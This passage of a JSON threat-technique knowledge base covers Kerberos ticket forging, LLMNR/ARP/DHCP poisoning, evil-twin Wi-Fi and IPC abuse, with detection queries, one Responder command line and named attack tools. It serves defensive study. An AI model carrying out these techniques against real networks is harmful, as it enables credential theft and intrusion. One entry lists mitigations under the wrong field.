      "Periodically review for new and unknown network provider DLLs within the Registry (HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\<NetworkProviderName>\\NetworkProvider\\ProviderPath).Ensure only valid network provider DLLs are registered. The name of these can be found in the Registry key atHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order, and have corresponding service subkey pointing to a DLL atHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentC ontrolSet\\Services\\<NetworkProviderName>\\NetworkProvider.",
      "Starting in Windows 11 22H2, theEnableMPRNotificationspolicy can be disabled through Group Policy or through a configuration service provider to prevent Winlogon from sending credentials to network providers.[6]",
      "Restrict Registry permissions to disallow the modification of sensitive Registry keys such asHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order."
    ]
  },
  "T1556.009": {
    "Name": "Modify Authentication Process:Conditional Access Policies",
    "Description": "Adversaries may disable or modify conditional access policies to enable persistent access to compromised accounts. Conditional access policies are additional verifications used by identity providers and identity and access management systems to determine whether a user should be granted access to a resource.For example, in Entra ID, Okta, and JumpCloud, users can be denied access to applications based on their IP address, device enrollment status, and use of multi-factor authentication.[1][2][3]In some cases, identity providers may also support the use of risk-based metrics to deny sign-ins based on a variety of indicators. In AWS and GCP, IAM policies can containconditionattributes that verify arbitrary constraints such as the source IP, the date the request was made, and the nature of the resources or regions being requested.[4][5]These measures help to prevent compromised credentials from resulting in unauthorized access to data or resources, as well as limit user permissions to only those required.By modifying conditional access policies, such as adding additional trusted IP ranges, removingMulti-Factor Authenticationrequirements, or allowing additionalUnused/Unsupported Cloud Regions, adversaries may be able to ensure persistent access to accounts and circumvent defensive measures.",
    "Detects": [
      "Monitor for changes made to security settings related to Entra ID Conditional Access Policies. For example, these can be found in the Entra ID audit log under the operation nameUpdate Conditional Access policy.[7]",
      "Monitor for changes made to conditional access policies used by SaaS identity providers and internal IaaS identity and access management systems."
    ],
    "Procedure Examples": [
      "Scattered Spiderhas added additional trusted locations to Azure AD conditional access policies.[6]"
    ]
  },
  "T1557": {
    "Name": "Adversary-in-the-Middle",
    "Description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such asNetwork Sniffing,Transmitted Data Manipulation, or replay attacks (Exploitation for Credential Access). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.[1]For example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.[2][3][4]Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens (Steal Application Access Token) and session cookies (Steal Web Session Cookie).[5][6]Downgrade Attacks can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.[7][8][9]Adversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as inTransmitted Data Manipulation. Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially toImpair Defensesand/or in support of aNetwork Denial of Service.",
    "Detects": [
      "Monitor application logs for changes to settings and other events associated with network protocols and other services commonly abused for AiTM.[17]",
      "Monitor network traffic for anomalies associated with known AiTM behavior.",
      "Monitor for network traffic originating from unknown/unexpected hardware devices. Local network traffic metadata (such as source MAC addressing) as well as usage of network management protocols such as DHCP may be helpful in identifying hardware.",
      "Monitor for newly constructed services/daemons through Windows event logs for event IDs 4697 and 7045. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as remote logins or process creation events.",
      "Monitor HKLM\\Software\\Policies\\Microsoft\\Windows NT\\DNSClient for changes to the \"EnableMulticast\" DWORD value. A value of \"0\" indicates LLMNR is disabled."
    ],
    "Procedure Examples": [
      "ArcaneDoorincluded interception of HTTP traffic to victim devices to identify and parse command and control information sent to the device.[10]",
      "Dokproxies web traffic to potentially monitor and alter victim HTTP(S) traffic.[11][12]",
      "Kimsukyhas used modified versions of PHProxy to examine web traffic between the victim and the accessed website.[13]",
      "Line Runnerintercepts HTTP requests to the victim Cisco ASA, looking for a request with a 32-character, victim dependent parameter. If that parameter matches a value in the malware, a contained payload is then written to a Lua script and executed.[10]",
      "NPPSPYopens a new network listener for thempnotify.exeprocess that is typically contacted by the Winlogon process in Windows. A new, alternative RPC channel is set up with a malicious DLL recording plaintext credentials entered into Winlogon, effectively intercepting and redirecting the logon information.[14]",
      "Sea Turtlemodified DNS records at service providers to redirect traffic from legitimate resources toSea Turtle-controlled servers to enable adversary-in-the-middle attacks for credential capture.[15][16]"
    ]
  },
  "T1557.001": {
    "Name": "Adversary-in-the-Middle:LLMNR/NBT-NS Poisoning and SMB Relay",
    "Description": "By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials.Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name.[1][2]Adversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or throughNetwork Sniffingand crack the hashes offline throughBrute Forceto obtain the plaintext passwords.In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv1/v2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it.[3][4]Additionally, adversaries may encapsulate the NTLMv1/v2 hashes into various protocols, such as LDAP, SMB, MSSQL and HTTP, to expand and use multiple services with the valid NTLM response.Several tools may be used to poison name services within local networks such as NBNSpoof, Metasploit, andResponder.[5][6][7]",
    "Detects": [
      "Monitor for traffic on ports UDP 5355 and UDP 137 if LLMNR/NetBIOS is disabled by security policy.",
      "Monitor for network traffic originating from unknown/unexpected hardware devices. Local network traffic metadata (such as source MAC addressing) as well as usage of network management protocols such as DHCP may be helpful in identifying hardware.",
      "Monitor for newly constructed services/daemons through Windows event logs for event IDs 4697 and 7045.[4]Deploy an LLMNR/NBT-NS spoofing detection tool.[17]",
      "Monitor HKLM\\Software\\Policies\\Microsoft\\Windows NT\\DNSClient for changes to the \"EnableMulticast\" DWORD value. A value of \"0\" indicates LLMNR is disabled."
    ],
    "Procedure Examples": [
      "Empirecan use Inveigh to conduct name service poisoning for credential theft and associated relay attacks.[8][9]",
      "Impacketmodules like ntlmrelayx and smbrelayx can be used in conjunction withNetwork SniffingandLLMNR/NBT-NS Poisoning and SMB Relayto gather NetNTLM credentials forBrute Forceor relay attacks that can gain code execution.[10]",
      "Lazarus GroupexecutedResponderusing the command[Responder file path] -i [IP address] -rPvon a compromised host to harvest credentials and move laterally.[11]",
      "PoshC2can use Inveigh to conduct name service poisoning for credential theft and associated relay attacks.[12]",
      "Pupycan sniff plaintext network credentials and use NBNS Spoofing to poison name services.[13]",
      "Responderis used to poison name services to gather hashes and credentials from systems within a local network.[7]",
      "Wizard Spiderhas used the Invoke-Inveigh PowerShell cmdlets, likely for name service poisoning.[14]"
    ]
  },
  "T1557.002": {
    "Name": "Adversary-in-the-Middle:ARP Cache Poisoning",
    "Description": "Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such asNetwork SniffingorTransmitted Data Manipulation.The ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address.[1]Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.An adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.The ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.[2][3]Adversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.[2]",
    "Detects": [
      "Monitor network traffic for unusual ARP traffic, gratuitous ARP replies may be suspicious. Consider collecting changes to ARP caches across endpoints for signs of ARP poisoning. For example, if multiple IP addresses map to a single MAC address, this could be an indicator that the ARP cache has been poisoned.",
      "Monitor for network traffic originating from unknown/unexpected hardware devices. Local network traffic metadata (such as source MAC addressing) as well as usage of network management protocols such as DHCP may be helpful in identifying hardware."
    ],
    "Procedure Examples": [
      "Cleaverhas used custom tools to facilitate ARP cache poisoning.[3]",
      "LuminousMothhas used ARP spoofing to redirect a compromised machine to an actor-controlled website.[4]"
    ]
  },
  "T1557.003": {
    "Name": "Adversary-in-the-Middle:DHCP Spoofing",
    "Description": "Adversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. This may also enable follow-on behaviors such asNetwork SniffingorTransmitted Data Manipulation.DHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients.[1]The typical server-client interaction is as follows:The client broadcasts aDISCOVERmessage.The server responds with anOFFERmessage, which includes an available network address.The client broadcasts aREQUESTmessage, which includes the network address offered.The server acknowledges with anACKmessage and the client receives the network configuration parameters.Adversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations. For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers.[2][3]Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network.DHCPv6 clients can receive network configuration information without being assigned an IP address by sending aINFORMATION-REQUEST (code 11)message to theAll_DHCP_Relay_Agents_and_Serversmulticast address.[4]Adversaries may use their rogue DHCP server to respond to this request message with malicious network configurations.Rather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack (i.e,Service Exhaustion Flood) by generating many broadcast DISCOVER messages to exhaust a network’s DHCP allocation pool.",
    "Detects": [
      "Monitor Windows logs (ex: EIDs 1341, 1342, 1020, and 1063) for changes to DHCP settings. These may also highlight DHCP issues such as when IP allocations are low or have run out.[6][7]",
      "Monitor network traffic for suspicious/malicious behavior involving DHCP, such as changes in DNS and/or gateway parameters. Additionally, monitor network traffic for rogue DHCPv6 activity.",
      "Monitor network traffic for anomalies associated with known AiTM behavior. Consider monitoring for modifications to system configuration files involved in shaping network traffic flow."
    ],
    "Procedure Examples": [
      "Consider filtering DHCP traffic on ports 67 and 68 to/from unknown or untrusted DHCP servers. Additionally, port security may also be enabled on layer switches. Furthermore, consider enabling DHCP snooping on layer 2 switches as it will prevent DHCP spoofing attacks and starvation attacks. Consider tracking available IP addresses through a script or a tool.Additionally, block DHCPv6 traffic and incoming router advertisements, especially if IPv6 is not commonly used in the network.[5]",
      "Network intrusion detection and prevention systems that can identify traffic patterns indicative of AiTM activity can be used to mitigate activity at the network level.[6]"
    ]
  },
  "T1557.004": {
    "Name": "Adversary-in-the-Middle:Evil Twin",
    "Description": "Adversaries may host seemingly genuine Wi-Fi access points to deceive users into connecting to malicious networks as a way of supporting follow-on behaviors such asNetwork Sniffing,Transmitted Data Manipulation, orInput Capture.[1]By using a Service Set Identifier (SSID) of a legitimate Wi-Fi network, fraudulent Wi-Fi access points may trick devices or users into connecting to malicious Wi-Fi networks.[2][3]Adversaries may provide a stronger signal strength or block access to Wi-Fi access points to coerce or entice victim devices into connecting to malicious networks.[4]A Wi-Fi Pineapple – a network security auditing and penetration testing tool – may be deployed in Evil Twin attacks for ease of use and broader range. Custom certificates may be used in an attempt to intercept HTTPS traffic.Similarly, adversaries may also listen for client devices sending probe requests for known or previously connected networks (Preferred Network Lists or PNLs). When a malicious access point receives a probe request, adversaries can respond with the same SSID to imitate the trusted, known network.[4]Victim devices are led to believe the responding access point is from their PNL and initiate a connection to the fraudulent network.Upon logging into the malicious Wi-Fi access point, a user may be directed to a fake login page or captive portal webpage to capture the victim’s credentials. Once a user is logged into the fraudulent Wi-Fi network, the adversary may able to monitor network activity, manipulate data, or steal additional credentials. Locations with high concentrations of public Wi-Fi access, such as airports, coffee shops, or libraries, may be targets for adversaries to set up illegitimate Wi-Fi access points.",
    "Detects": [
      "Monitor network traffic for suspicious/malicious behavior involving evil twin attacks. Intrusion prevention systems (WIDS) can identify traffic patterns indicative of activity associated with evil twins, rogue access points, and adversary-in-the-middle activity.",
      "Monitor for network traffic originating from unknown/unexpected hardware devices. Local network traffic metadata (such as source MAC addressing), as well as usage of network management protocols such as enabling DHCP snooping, may be helpful in identifying rogue hardware.[6]Additionally, wireless pentesting hardware is often limited to older802.11protocols such as802.11gor802.11a.[4]"
    ],
    "Procedure Examples": [
      "APT28has used a Wi-Fi Pineapple to set up Evil Twin Wi-Fi Poisoning for the purposes of capturing victim credentials or planting espionage-oriented malware.[5]"
    ]
  },
  "T1558": {
    "Name": "Steal or Forge Kerberos Tickets",
    "Description": "Adversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enablePass the Ticket. Kerberos is an authentication protocol widely used in modern Windows domain environments. In Kerberos environments, referred to as \"realms\", there are three basic participants: client, service, and Key Distribution Center (KDC).[1]Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated. The KDC is responsible for both authentication and ticket granting.  Adversaries may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access.On Windows, the built-inklistutility can be used to list and analyze cached Kerberos tickets.[2]",
    "Detects": [
      "Monitor for anomalous Kerberos activity, such as malformed or blank fields in Windows logon/logoff events (Event ID 4624, 4672, 4634), RC4 encryption within ticket granting tickets (TGTs), and ticket granting service (TGS) requests without preceding TGT requests.[7][8][9]Monitor the lifetime of TGT tickets for values that differ from the default domain duration.[10]Monitor for indications ofPass the Ticketbeing used to move laterally.",
      "Monitor executed commands and arguments that may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enablePass the Ticket.",
      "Monitor for unexpected processes interacting with lsass.exe.[11]Common credential dumpers such asMimikatzaccess the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details, including Kerberos tickets, are stored.",
      "Enable Audit Kerberos Service Ticket Operations to log Kerberos TGS service ticket requests. Particularly investigate irregular patterns of activity (ex: accounts making numerous requests, Event ID 4769, within a small time frame, especially if they also request RC4 encryption [Type 0x17]).[12][6]"
    ],
    "Procedure Examples": [
      "Akirahave used scripts to dump Kerberos authentication credentials.[3]"
    ]
  },
  "T1558.001": {
    "Name": "Steal or Forge Kerberos Tickets:Golden Ticket",
    "Description": "Adversaries who have the KRBTGT account password hash may forge Kerberos ticket-granting tickets (TGT), also known as a golden ticket.[1]Golden tickets enable adversaries to generate authentication material for any account in Active Directory.[2]Using a golden ticket, adversaries are then able to request ticket granting service (TGS) tickets, which enable access to specific resources. Golden tickets require adversaries to interact with the Key Distribution Center (KDC) in order to obtain TGS.[3]The KDC service runs all on domain controllers that are part of an Active Directory domain. KRBTGT is the Kerberos Key Distribution Center (KDC) service account and is responsible for encrypting and signing all Kerberos tickets.[4]The KRBTGT password hash may be obtained usingOS Credential Dumpingand privileged access to a domain controller.",
    "Detects": [
      "Monitor for anomalous Kerberos activity, such as malformed or blank fields in Windows logon/logoff events (Event ID 4769, 4768), RC4 encryption within TGTs, and TGS requests without preceding TGT requests. Monitor the lifetime of TGT tickets for values that differ from the default domain duration. Monitor for indications of Pass the Ticket being used to move laterally.",
      "Monitor for anomalous Kerberos activity, such as malformed or blank fields in Windows logon/logoff events (Event ID 4624, 4634, 4672). Correlate other security systems with login information (e.g., a user has the KRBTGT account password hash and forges Kerberos ticket-granting tickets)."
    ],
    "Procedure Examples": [
      "Empirecan leverage its implementation ofMimikatzto obtain and use golden tickets.[5]",
      "Ke3changhas usedMimikatzto generate Kerberos golden tickets.[6]",
      "Mimikatz's kerberos module can create golden tickets.[7][8]",
      "Rubeuscan forge a ticket-granting ticket.[9]",
      "Sliverincorporates theRubeusframework to allow for Kerberos ticket manipulation, specifically for forging Kerberos Golden Tickets.[10]"
    ]
  },
  "T1558.002": {
    "Name": "Steal or Forge Kerberos Tickets:Silver Ticket",
    "Description": "Adversaries who have the password hash of a target service account (e.g. SharePoint, MSSQL) may forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets. Kerberos TGS tickets are also known as service tickets.[1]Silver tickets are more limited in scope in than golden tickets in that they only enable adversaries to access a particular resource (e.g. MSSQL) and the system that hosts the resource; however, unlike golden tickets, adversaries with the ability to forge silver tickets are able to create TGS tickets without interacting with the Key Distribution Center (KDC), potentially making detection more difficult.[2]Password hashes for target services may be obtained usingOS Credential DumpingorKerberoasting.",
    "Detects": [
      "Monitor for anomalous Kerberos activity, such as malformed or blank fields in Windows logon/logoff events (Event ID 4624, 4634, 4672)."
    ],
    "Procedure Examples": [
      "AADInternalscan be used to forge Kerberos tickets using the password hash of the AZUREADSSOACC account.[3]",
      "Empirecan leverage its implementation ofMimikatzto obtain and use silver tickets.[4]",
      "Mimikatz's kerberos module can create silver tickets.[5]",
      "Rubeuscan create silver tickets.[6]"
    ]
  },
  "T1558.003": {
    "Name": "Steal or Forge Kerberos Tickets:Kerberoasting",
    "Description": "Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable toBrute Force.[1][2]Service principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service[3]).[4][5][6][7]Adversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC).[1][2]Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offlineBrute Forceattacks that may expose plaintext credentials.[2][1][7]This same behavior could be executed using service tickets captured from network traffic.[2]Cracked hashes may enablePersistence,Privilege Escalation, andLateral Movementvia access toValid Accounts.[6]",
    "Detects": [
      "Monitor for anomalous Kerberos activity, such as enabling Audit Kerberos Service Ticket Operations to log Kerberos TGS service ticket requests. Particularly investigate irregular patterns of activity (ex: accounts making numerous requests, Event ID 4769, within a small time frame, especially if they also request RC4 encryption [Type 0x17])."
    ],
    "Procedure Examples": [
      "Brute Ratel C4can decode Kerberos 5 tickets and convert it to hashcat format for subsequent cracking.[8]",
      "EmpireusesPowerSploit'sInvoke-Kerberoastto request service tickets and return crackable ticket hashes.[9]",
      "FIN7has used Kerberoasting PowerShell commands such as,Invoke-Kerberoastfor credential access and to enable lateral movement.[10][11]",
      "Impacketmodules like GetUserSPNs can be used to get Service Principal Names (SPNs) for user accounts. The output is formatted to be compatible with cracking tools like John the Ripper and Hashcat.[12]",
      "Indrik Spiderhas conducted Kerberoasting attacks using a module from GitHub.[13]",
      "Leviathanused Kerberoasting techniques duringLeviathan Australian Intrusions.[14]",
      "DuringOperation Wocao, threat actors usedPowerSploit'sInvoke-Kerberoastmodule to request encrypted service tickets and bruteforce the passwords of Windows service accounts offline.[15]",
      "PowerSploit'sInvoke-Kerberoastmodule can request service tickets and return crackable ticket hashes.[16][7]",
      "Rubeuscan use theKerberosRequestorSecurityToken.GetRequestmethod to request kerberoastable service tickets.[17]",
      "SILENTTRINITYcontains a module to conduct Kerberoasting.[18]",
      "During theSolarWinds Compromise,APT29obtained Ticket Granting Service (TGS) tickets for Active Directory Service Principle Names to crack offline.[19]",
      "Wizard Spiderhas used Rubeus, MimiKatz Kerberos module, and the Invoke-Kerberoast cmdlet to steal AES hashes.[20][21][22][23][24]"
    ]
  },
  "T1558.004": {
    "Name": "Steal or Forge Kerberos Tickets:AS-REP Roasting",
    "Description": "Adversaries may reveal credentials of accounts that have disabled Kerberos preauthentication byPassword CrackingKerberos messages.[1]Preauthentication offers protection against offlinePassword Cracking. When enabled, a user requesting access to a resource initiates communication with the Domain Controller (DC) by sending an Authentication Server Request (AS-REQ) message with a timestamp that is encrypted with the hash of their password. If and only if the DC is able to successfully decrypt the timestamp with the hash of the user’s password, it will then send an Authentication Server Response (AS-REP) message that contains the Ticket Granting Ticket (TGT) to the user. Part of the AS-REP message is signed with the user’s password.[2]For each account found without preauthentication, an adversary may send an AS-REQ message without the encrypted timestamp and receive an AS-REP message with TGT data which may be encrypted with an insecure algorithm such as RC4. The recovered encrypted data may be vulnerable to offlinePassword Crackingattacks similarly toKerberoastingand expose plaintext credentials.[1][3]An account registered to a domain, with or without special privileges, can be abused to list all domain accounts that have preauthentication disabled by utilizing Windows tools likePowerShellwith an LDAP filter. Alternatively, the adversary may send an AS-REQ message for each user. If the DC responds without errors, the account does not require preauthentication and the AS-REP message will already contain the encrypted data.[1][3]Cracked hashes may enablePersistence,Privilege Escalation, andLateral Movementvia access toValid Accounts.[4]",
    "Detects": [
      "Monitor for anomalous activity, such as enabling Audit Kerberos Service Ticket Operations to log Kerberos TGS service ticket requests. Particularly investigate irregular patterns of activity (ex: accounts making numerous requests, Event ID 4768 and 4769, within a small time frame, especially if they also request RC4 encryption [Type 0x17], pre-authentication not required [Type: 0x0])."
    ],
    "Procedure Examples": [
      "Rubeuscan reveal the credentials of accounts that have Kerberos pre-authentication disabled through AS-REP roasting.[5][6][7]"
    ]
  },
  "T1558.005": {
    "Name": "Steal or Forge Kerberos Tickets:Ccache Files",
    "Description": "Adversaries may attempt to steal Kerberos tickets stored in credential cache files (or ccache). These files are used for short term storage of a user's active session credentials. The ccache file is created upon user authentication and allows for access to multiple services without the user having to re-enter credentials.The/etc/krb5.confconfiguration file and theKRB5CCNAMEenvironment variable are used to set the storage location for ccache entries. On Linux, credentials are typically stored in the/tmpdirectory with a naming format ofkrb5cc_%UID%orkrb5.ccache. On macOS, ccache entries are stored by default in memory with anAPI:{uuid}naming scheme. Typically, users interact with ticket storage usingkinit, which obtains a Ticket-Granting-Ticket (TGT) for the principal;klist, which lists obtained tickets currently held in the credentials cache; and other built-in binaries.[1][2]Adversaries can collect tickets from ccache files stored on disk and authenticate as the current user without their password to performPass the Ticketattacks. Adversaries can also use these tickets to impersonate legitimate users with elevated privileges to performPrivilege Escalation. Tools like Kekeo can also be used by adversaries to convert ccache files to Windows format for furtherLateral Movement. On macOS, adversaries may use open-source tools or the Kerberos framework to interact with ccache files and extract TGTs or Service Tickets via lower-level APIs.[3][4][5][6]",
    "Detects": [
      "Monitor for abnormal read access to ccache files located in the/tmpdirectory of a system from non-user processes."
    ],
    "Procedure Examples": [
      "Impackettools – such asgetST.pyorticketer.py– can be used to steal or forge Kerberos tickets using ccache files given a password, hash, aesKey, or TGT.[1][7]"
    ]
  },
  "T1559": {
    "Name": "Inter-Process Communication",
    "Description": "Adversaries may abuse inter-process communication (IPC) mechanisms for local code or command execution. IPC is typically used by processes to share data, communicate with each other, or synchronize execution. IPC is also commonly used to avoid situations such as deadlocks, which occurs when processes are stuck in a cyclic waiting pattern.Adversaries may abuse IPC to execute arbitrary code or commands. IPC mechanisms may differ depending on OS, but typically exists in a form accessible through programming languages/libraries or native interfaces such as WindowsDynamic Data ExchangeorComponent Object Model. Linux environments support several different IPC mechanisms, two of which being sockets and pipes.[1]Higher level execution mediums, such as those ofCommand and Scripting Interpreters, may also leverage underlying IPC mechanisms. Adversaries may also useRemote Servicessuch asDistributed Component Object Modelto facilitate remote IPC execution.[2]",
    "Detects": [
      "Monitor for the loading of unusual modules or DLLs into processes. Specifically focus on modules that are not typically loaded or associated with IPC mechanisms.Analytic 1 - Unrecognized DLLs.sourcetype=Sysmon EventCode=7| search module_path != \"/usr/lib/\" OR module_path != \"/windows/system32/\" OR module_path != \"/lib/*\"| stats count by module_path process_name user| where module_path IN (\"suspicious_modules.dll\", \"unknown.so\")",
      "Monitor processes that attempt to access other processes, especially if the access is unusual (such as low-privileged processes interacting with high-privileged processes like a VPN service).[25]Analytic 1 - Abnormal process access.sourcetype=Sysmon EventCode=10| search access_type=\"IPC\" AND process_privilege!=\"high\"| stats count by process_name target_process_name user| where target_process_name IN (\"VPNService\", \"Systemd\", \"svchost.exe\")",
      "Monitor the creation of processes that are related to the abuse of IPC mechanisms, particularly those that communicate with higher-privileged services or perform suspicious operations.Analytic 1 - Processes using IPC mechanisms.(( sourcetype=WinEventLog:Security EventCode=4688) OR (sourcetype=Sysmon EventCode=1))| search parent_process IN (\"XPCService\", \"com.apple.securityd\") OR process_name IN (\"cmd.exe\", \"bash\", \"osascript\")",
      "Monitor for any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent."
    ],
    "Procedure Examples": [
      "Cyclops Blinkhas the ability to create a pipe to enable inter-process communication.[3]",
      "HyperStackcan connect to the IPC$ share on remote machines.[4]",
      "LunarWebcan retrieve output from arbitrary processes and shell commands via a pipe.[5]",
      "Ninjacan use pipes to redirect the standard input and the standard output.[6]",
      "OilBoostercan read the results of command line execution via an unnamed pipe connected to the process.[7]",
      "DuringOperation MidnightEclipse, threat actors wrote output to stdout then piped it to bash for execution.[8]",
      "PITSTOPcan listen over the Unix domain socket located at/data/runtime/cockpit/wd.fd.[9]",
      "Raspberry Robincontains an embedded customTornetwork client that communicates with the primary payload via shared process memory.[10]",
      "ROADSWEEPcan pipe command output to a targeted process.[11]",
      "When executing with non-root permissions,RotaJakirouses the theshmget APIto create shared memory between other knownRotaJakiroprocesses. This allows processes to communicate with each other and share their PID.[12]",
      "StealBitcan use interprocess communication (IPC) to enable the designation of multiple files for exfiltration in a scalable manner.[13]",
      "Uroburoshas the ability to move data between its kernel and user mode components, generally using named pipes.[14]"
    ]
  },
  "T1559.001": {
    "Name": "Inter-Process Communication:Component Object Model",
    "Description": "Adversaries may use the Windows Component Object Model (COM) for local code execution. COM is an inter-process communication (IPC) component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces.[1]Through COM, a client object can call methods of server objects, which are typically binary Dynamic Link Libraries (DLL) or executables (EXE).[2]Remote COM execution is facilitated byRemote Servicessuch asDistributed Component Object Model(DCOM).[1]Various COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, andVisual Basic.[2]Specific COM objects also exist to directly perform functions beyond code execution, such as creating aScheduled Task/Job, fileless download/execution, and other adversary behaviors related to privilege escalation and persistence.[1][3]",
    "Detects": [
      "Monitor for COM objects loading DLLs and other modules not typically associated with the application.[28]",
      "Monitor for newly executed processes that are associated with COM objects, especially those invoked by a user different than the one currently logged on.",
      "Monitor for any attempts to enable scripts running on a system would be considered suspicious. Enumeration of COM objects, viaQuery RegistryorPowerShell, may also proceed malicious use.[1][28]"
    ],
    "Procedure Examples": [
      "Bumblebeecan use a COM object to execute queries to gather system information.[4]",
      "DarkTortillahas used theWshShortcutCOM object to create a .lnk shortcut file in the Windows startup folder.[5]",
      "FunnyDreamcan use com objects identified withCLSID_ShellLink(IShellLinkandIPersistFile) andWScript.Shell(RegWritemethod) to enable persistence mechanisms.[6]",
      "Gamaredon Groupmalware can insert malicious macros into documents using aMicrosoft.Office.Interopobject.[7]",
      "Gelsemiumcan use theIARPUinstallerStringLauncherCOM interface are part of its UAC bypass process.[8]",
      "HermeticWizardcan execute files on remote machines using DCOM.[9]",
      "InvisiMolecan use theITaskService,ITaskDefinitionandITaskSettingsCOM interfaces to schedule a task.[10]",
      "Latrodectuscan use the Windows Component Object Model (COM) to set scheduled tasks.[11][12]",
      "Milancan use a COM component to generate scheduled tasks.[13]",
      "MuddyWaterhas used malware that has the capability to execute malicious code via COM, DCOM, and Outlook.[14][15][16]",
      "Neoichorcan use the Internet Explorer (IE) COM interface to connect and receive commands from C2.[17]",
      "POWERSTATScan use DCOM (targeting the 127.0.0.1 loopback address) to execute additional payloads on compromised hosts.[18]",
      "Ramsaycan use the Windows COM API to schedule tasks and maintain persistence.[19]",
      "Raspberry Robincreates an elevated COM object forCMLuaUtiland uses this to set a registry value that points to the malicious LNK file during execution.[20]",
      "SILENTTRINITYcan insert malicious shellcode into Excel.exe using aMicrosoft.Office.Interopobject.[21]",
      "TrickBotused COM to setup scheduled task for persistence.[22]",
      "Ursnifdroppers have used COM objects to execute the malware's full executable payload.[23]"
    ]
  },
  "T1559.002": {
    "Name": "Inter-Process Communication:Dynamic Data Exchange",
